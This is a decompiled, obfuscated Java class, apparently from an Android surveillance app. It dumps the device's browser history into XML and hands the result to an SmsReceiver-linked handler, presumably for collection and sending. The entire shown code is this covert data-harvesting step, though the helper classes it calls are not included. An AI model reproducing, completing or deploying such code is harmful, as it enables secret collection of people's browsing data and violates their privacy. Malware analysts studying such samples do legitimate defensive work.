package com.network.media;

import android.content.ContentResolver;
import android.content.Context;
import android.util.Xml;
import com.network.android.SmsReceiver;
import com.network.android.c.a.a;
import com.network.android.m;
import com.network.b.b;
import java.io.StringWriter;
import org.xmlpull.v1.XmlSerializer;

/* access modifiers changed from: package-private */
public final class l implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f169a;
    final /* synthetic */ ContentResolver b;

    l(Context context, ContentResolver contentResolver) {
        this.f169a = context;
        this.b = contentResolver;
    }

    public final void run() {
        try {
            if (b.s) {
                a.a("Dump dumpBrowserData is true. returning");
                return;
            }
            XmlSerializer newSerializer = Xml.newSerializer();
            StringWriter stringWriter = new StringWriter();
            Context context = this.f169a;
            SmsReceiver.a(newSerializer, stringWriter);
            a.a("Dump innerDump Browser history");
            m.a(newSerializer, this.b);
            a.a("Dump innerDump Browser history End");
            SmsReceiver.a(this.f169a, newSerializer, stringWriter);
            SmsReceiver.c.post(new m(this));
        } catch (Throwable th) {
            a.a("Dump innerDump getBrowserHistory Exception- " + th.getMessage(), th);
        }
    }
}
